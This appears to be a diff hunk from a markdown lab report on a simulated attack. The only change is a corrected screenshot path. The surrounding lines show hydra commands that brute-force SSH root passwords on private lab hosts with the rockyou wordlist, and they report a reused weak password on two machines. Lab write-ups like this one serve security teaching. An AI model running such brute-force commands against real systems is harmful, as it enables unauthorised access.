@@ -90,7 +90,7 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.8
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.101
 ```
 
-![Hydra confirms root / november also valid on 10.0.0.101 — same weak password reused across both systems](screenshots/attack-simulation/hydra_ssh_101.png)
+![Hydra confirms root / november also valid on 10.0.0.101 — same weak password reused across both systems](../screenshots/attack-simulation/hydra_ssh_101.png)
 
 **Result:** Password `november` is valid on both Linux hosts — a critical credential reuse vulnerability. The attacker SSH's into `10.0.0.8` and begins post-exploitation reconnaissance.
 
